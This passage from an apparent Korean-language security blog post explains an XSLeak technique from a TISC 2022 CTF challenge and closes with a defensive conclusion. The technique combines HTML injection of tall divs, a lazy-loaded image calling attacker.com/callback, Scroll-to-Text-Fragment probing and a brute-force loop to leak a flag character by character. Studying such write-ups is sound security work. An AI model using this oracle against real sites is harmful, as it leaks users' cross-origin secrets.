<div class="min-vh-100">Min-height 100vh</div>
<div class="min-vh-100">Min-height 100vh</div>
<img loading="lazy" src="https://attacker.com/callback" />
```

이는 Bootstrap의 `min-vh-100` 클래스를 활용해서 각 `div` 가 viewport 높이를 차지하도록 구성한다. 이로 인해 Lazy Loaded 이미지는 초기 페이지 렌더링 시 viewport 밖에 위치하게 된다.

HTML Injection을 성공적으로 주입하고 설정을 마친 이후에 풀이자는 STTF 기능을 사용하여 특정 텍스트를 검색하는 요청을 보낸다. 만약 페이지 내에 텍스트가 존재할 경우 브라우저는 해당 텍스트로 자동 스크롤을 수행한다.

```html
/verify?token=ADMIN_TOKEN#:~:text=TISC{partial_flag
```

만약 텍스트로 스크롤이 발생할 경우 이전에 viewport 밖에 있던 Lazy Loaded 이미지가 viewport 내로 진입하게 되어 브라우저가 해당 이미지를 렌더링하려고 시도한다. 이때 풀이자의 서버로 HTTP 요청이 전송되므로 이를 이용해 스크롤 발생 여부를 감지할 수 있다. 이와 같이 스크롤 여부를 감지할 수 있는 이유는 실제 HTML Injection이 진행될 경우 아래와 같이 페이지가 렌더링 되어 `div` 가 viewport에 수직 공간을 모두 점유하기 때문이다.

```jsx
This token belongs to <div class="min-vh-100">...</div><img loading=lazy src="...">. If <div class="min-vh-100">...</div><img loading=lazy src="..."> asks for your token, you can give them this token: TISC{ADMIN_FLAG}.
```

STTF를 통해 실제 텍스트 매칭이 발생할 경우 해당 텍스트 위치로 자동 스크롤이 발생하므로 공격자 서버로 요청이 전송되게 된다. (FLAG 텍스트는 페이지 최하단에 위치하여 있기 때문이다.) 풀이자는 이 공격을 브루트포싱을 이용해 자동화하여 전체 FLAG를 유출할 수 있다.

```python
for char in charset:
    test_fragment = f"TISC{{{current_flag}{char}"
    smuggled_request = create_smuggled_request(test_fragment)

    if callback_received():
        current_flag += char
        break
```

이는 본 챌린지를 해결하기 위한 3가지 취약점 체이닝 중 한가지 부분만을 중점적으로 다룬 내용이다. 만약 챌린지를 직접 해결하고 싶거나 더 자세한 내용을 확인하고 싶은 경우 아래 링크에서 확인할 수 있다.

[Level 5B - PALINDROME's Secret (Author Writeup) | CTFs](https://ctf.zeyu2001.com/2022/tisc-2022/level-5b-palindromes-secret-author-writeup)

## Conclusion

XSLeak 취약점은 현대 웹 보안 환경에서 가장 교묘하면서도 위험한 공격 백터 중 하나로 자리잡고 있다. 전통적인 웹 취약점들과 달리 XSLeak은 브라우저의 정상적인 기능과 웹 표준을 악용하여 정보를 유출한다는 점에서 근본적으로 다른 특성을 가진다. 이는 공격자가 직접적인 보안 결함을 찾을 필요 없이 브라우저와 웹 플랫폼 자체의 설계 특성을 이용할 수 있음을 의미하며, 이로 인해 탐지와 방어가 극도로 어려운 상황이 조성되고 있다.

특히 XSLeak 취약점이 가지는 가장 치명적인 특징은 Cross-Origin 환경에서도 정보 유출이 가능하다는 점이다. Same-Origin Policy라는 웹 보안의 핵심 원칙을 우회하여 타 도메인의 정보에 간접적으로 접근할 수 있다는 사실은 웹 보안 모델의 근본적인 한계를 드러낸다.

현대 브라우저 벤더들이 CORS, CSP, Timing-Allow-Origin, Same-Site 쿠키 정책 등 다양한 방어 메커니즘을 도입하고 있음에도 불구하고, 공격자들은 지속적으로 새로운 우회 기법을 개발하고 있다. 이는 XSLeak이 단순한 구현 버그가 아닌 웹 플랫폼의 구조적 특성에서 비롯된 문제이기 때문이다. 브라우저가 성능 최적화와 사용자 경험 향상을 위해 도입하는 모든 새로운 기능들이 잠재적인 XSLeak 공격 경로가 될 수 있다는 현실은 웹 보안의 복잡성을 극명하게 보여준다.

이를 기반으로 XSLeak은 새로운 차원의 도전과제를 제시한다. 전통적인 보안 검토 방법론으로는 탐지하기 어려운 이 취약점들은 코드 레벨에서의 완벽한 구현에도 불구하고 발생할 수 있다. 이는 보안 검토 프로세스에 브라우저 동작 분석, 타이밍 분석, 사이드 채널 검증 등 새로운 관점을 포함해야 함을 의미한다. 또한 새로운 웹 기술이나 브라우저 기능을 도입할 때는 반드시 XSLeak 관점에서의 보안 영향 평가가 선행되어야 한다.

---
